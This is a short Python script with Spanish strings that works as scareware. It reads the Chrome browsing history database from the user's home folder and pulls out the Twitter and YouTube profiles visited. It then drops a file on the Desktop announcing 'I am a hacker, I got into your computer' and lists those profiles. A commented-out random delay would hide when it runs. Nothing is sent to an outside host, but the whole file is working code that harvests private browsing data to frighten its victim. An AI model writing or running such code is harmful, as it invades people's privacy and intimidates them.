import os
import random
import time
import sqlite3
import pathlib
import re


NOMBRE_ARCHIVO = "espiar_perfiles_tw_fb_yt....txt"


def get_user_path():
    return "{}".format(pathlib.Path.home())


def get_chrome_data(user_path):
    urls = None
    while not urls:
        try:
            ch_history_path = user_path + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
            con = sqlite3.connect(ch_history_path)
            cursor = con.cursor()
            cursor.execute("SELECT title, url, visit_count FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            con.close()
            return urls
        except sqlite3.OperationalError:
            print("La base de datos esta bloqueada, reintentando en 2 segundos")
            time.sleep(2)


def scare_user_with_twitter(hacker_doc, chrome_history):
    profiles_visited = []
    for url in chrome_history[:1000]:
        results = re.findall("https://twitter.com/([A-Za-z0-9,._]+)$", url[1])
        if results and results[0] not in ["notifications", "home", "settings", "login", "signup"]:
            profiles_visited.append(results[0])
    hacker_doc.write("He visto que has entrado a {} perfiles de twitter, y estos perfiles son:\n[{}]"
                     .format(len(profiles_visited), ", ".join(profiles_visited)))


def scare_user_with_youtube(hacker_doc, chrome_history):
    profiles_visited = []
    hacker_doc.write("\n")
    for url in chrome_history[:1000]:
        results = re.findall("https://www.youtube.com/[A-Za-z0-9,._]/([A-Za-z0-9,._]+)$", url[1])
        if results:
            profiles_visited.append(results[0])
    hacker_doc.write("He visto que has entrado a {} perfiles de youtube, y estos perfiles son:\n[{}]"
                     .format(len(profiles_visited), ", ".join(profiles_visited)))


"""def delay():
    n_hours = random.randrange(1, 2)
    n_min = random.randrange(1, 2)
    print("Dormiremos {} horas y  {} minutos".format(n_hours, n_min))
    time.sleep((n_hours * 60 * 60) + (n_min * 60))"""


def crear_archivo(user_path):
    hacker_doc = open(user_path + "\\Desktop\\" + NOMBRE_ARCHIVO, "w", encoding="utf-8")
    hacker_doc.write("Soy un hacker, me he colado en tu ordenador.\n\n")
    return hacker_doc


def main():
    user_path = get_user_path()
    """delay()"""
    hacker_doc = crear_archivo(user_path)
    chrome_history = get_chrome_data(user_path)
    scare_user_with_twitter(hacker_doc, chrome_history)
    scare_user_with_youtube(hacker_doc, chrome_history)


if __name__ == "__main__":
    main()
